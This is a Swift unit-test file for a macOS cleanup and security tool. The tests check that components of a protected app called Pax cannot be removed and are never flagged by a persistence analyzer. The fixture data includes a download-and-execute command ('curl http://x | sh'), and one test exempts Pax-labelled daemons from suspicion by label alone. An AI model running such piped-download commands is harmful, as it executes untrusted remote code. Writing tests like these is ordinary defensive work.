// SPDX-License-Identifier: MIT
import XCTest
@testable import SwoopCore

final class PaxProtectionTests: XCTestCase {
    let safety = PathSafety(home: "/Users/sam")

    func testProtectedPaths() {
        let protected = [
            "/Library/PaxGuard", "/Library/PaxGuard/pax-guard", "/Library/PaxGuard/../PaxGuard/state.db",
            "/Library/LaunchDaemons/org.paxmobile.pax-guard.plist", "/Library/LaunchDaemons/com.example.pax-guard.plist",
            "/Applications/Pax.app", "/Applications/Pax Peace.app", "/Users/sam/Applications/Pax.app",
            "/Users/sam/Library/Preferences/org.paxmobile.pax.plist", "/Users/sam/Library/Containers/org.paxpeace.pax",
            "/Users/sam/Library/Group Containers/Z94GSK7JA8.org.paxmobile.pax", "/Users/sam/Library/Caches/org.paxmobile.pax",
            "/Users/sam/Library/Application Support/org.paxpeace.pax/x.json",
        ]
        for p in protected {
            XCTAssertTrue(PaxProtection.isProtectedPath(p), p)
            XCTAssertFalse(safety.check(p).isAllowed, p)
        }
        for p in ["/Applications/Paxton.app", "/Users/sam/Library/Caches/com.example.app", "/Applications/Safari Pax Helper.app/x",
                  "/Users/sam/Documents/pax notes.txt"] {
            XCTAssertFalse(PaxProtection.isProtectedPath(p), p)
        }
        // Ordinary removable things are still allowed.
        XCTAssertTrue(safety.check("/Users/sam/Library/Caches/com.example.app").isAllowed)
        XCTAssertTrue(safety.check("/Applications/Paxton.app").isAllowed)
    }

    func testPathSafetyDeniesPaxBeforeApplicationsRule() {
        XCTAssertEqual(safety.check("/Applications/Pax.app"), .denied("part of Pax (protected)"))
    }

    func testApps() {
        XCTAssertTrue(PaxProtection.isProtectedApp(bundleID: "org.paxmobile.pax"))
        XCTAssertTrue(PaxProtection.isProtectedApp(bundleID: "org.paxpeace.pax"))
        XCTAssertTrue(PaxProtection.isProtectedApp(bundleID: "com.renamed.app", teamID: "Z94GSK7JA8"))
        XCTAssertTrue(PaxProtection.isProtectedApp(bundleID: nil, path: "/Applications/Pax.app"))
        XCTAssertFalse(PaxProtection.isProtectedApp(bundleID: "com.google.Chrome", teamID: "EQHXZ8M8AV", path: "/Applications/Google Chrome.app"))
    }

    func testLaunchItemsProcessesProfiles() {
        XCTAssertTrue(PaxProtection.isProtectedLaunchItem(label: "org.paxmobile.pax-guard", path: "/Library/LaunchDaemons/x.plist", program: nil))
        XCTAssertTrue(PaxProtection.isProtectedLaunchItem(label: "x", path: "/Library/LaunchDaemons/x.plist", program: "/Library/PaxGuard/pax-guard"))
        XCTAssertFalse(PaxProtection.isProtectedLaunchItem(label: "com.example.agent", path: "/Library/LaunchAgents/com.example.agent.plist", program: "/usr/local/bin/x"))
        XCTAssertTrue(PaxProtection.isProtectedProcess(name: "pax-guard", bundleID: nil))
        XCTAssertTrue(PaxProtection.isProtectedProcess(name: "Pax", bundleID: nil))
        XCTAssertTrue(PaxProtection.isProtectedProcess(name: "Something", bundleID: "org.paxpeace.pax"))
        XCTAssertFalse(PaxProtection.isProtectedProcess(name: "Safari", bundleID: "com.apple.Safari"))
        XCTAssertTrue(PaxProtection.isProtectedProfile(identifier: "org.paxmobile.pax.device", organization: nil))
        XCTAssertTrue(PaxProtection.isProtectedProfile(identifier: nil, organization: "Pax Technologies"))
        XCTAssertFalse(PaxProtection.isProtectedProfile(identifier: "com.swoopkey.swoop.shield.dns", organization: "Swoop"))
    }

    func testSecurityCheckNeverFlagsPax() {
        // A Pax daemon that would otherwise look odd (unsigned shell script, mismatched name).
        let item = PersistenceItem(path: "/Library/LaunchDaemons/guard.plist", label: "org.paxmobile.pax-guard", program: "/bin/sh",
                                   arguments: ["/bin/sh", "-c", "curl http://x | sh"], runAtLoad: true, keepAlive: true,
                                   signedBy: nil, programExists: true)
        let f = PersistenceAnalyzer.analyze(item)
        XCTAssertEqual(f.severity, .info)
        XCTAssertTrue(f.isProtected)
        let other = PersistenceItem(path: "/Library/LaunchDaemons/x.plist", label: "x", program: "/bin/sh",
                                    arguments: ["/bin/sh", "-c", "curl http://x | sh"])
        XCTAssertEqual(PersistenceAnalyzer.analyze(other).severity, .suspicious)
        XCTAssertFalse(PersistenceAnalyzer.analyze(other).isProtected)
    }

    func testMaintenanceTasksDontTouchPax() {
        for t in MaintenanceTask.all {
            let c = t.command.lowercased()
            XCTAssertFalse(c.contains("pax"), t.id)
            XCTAssertFalse(c.contains("/etc/hosts") || c.contains("pfctl") || c.contains("networksetup"), t.id)
        }
    }
}
